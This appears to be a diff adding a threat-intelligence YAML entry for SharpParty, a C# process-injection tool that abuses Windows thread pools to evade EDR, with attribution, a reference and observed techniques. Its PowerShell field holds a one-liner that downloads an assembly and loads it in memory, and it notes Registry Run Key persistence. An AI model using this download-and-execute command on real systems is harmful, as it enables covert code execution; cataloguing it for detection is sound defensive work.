@@ -1,0 +1,25 @@
+description: SharpParty is a C# implementation of the PoolParty process injection
+  technique, enabling red teams to bypass EDR by injecting code into Windows thread
+  pools via msbuild.exe.
+attribution: Stroz Friedberg (LevelBlue Company)
+malware_families:
+- SharpParty
+TTPs:
+  processes: []
+  commandline: []
+  powershell:
+  - $data = (new-object net.webclient).downloaddata(http://127.0.0.1/sharpparty.exe);$assem
+    = [System.Reflection.Assembly]::Load($data);[SharpParty.Program]::Main(1 666.Split());
+  scripting_engine: []
+  registry_keys: []
+  image_load: []
+  network_connections: []
+  file_activity: []
+  persistence:
+  - Registry Run Key autorun to execute SharpParty payload
+  process_relations: []
+authors:
+- Will Rabb
+reference: https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/sharpparty-process-injection-in-c/
+date_of_publication: November 11, 2025
+file_creation_date: November 11, 2025
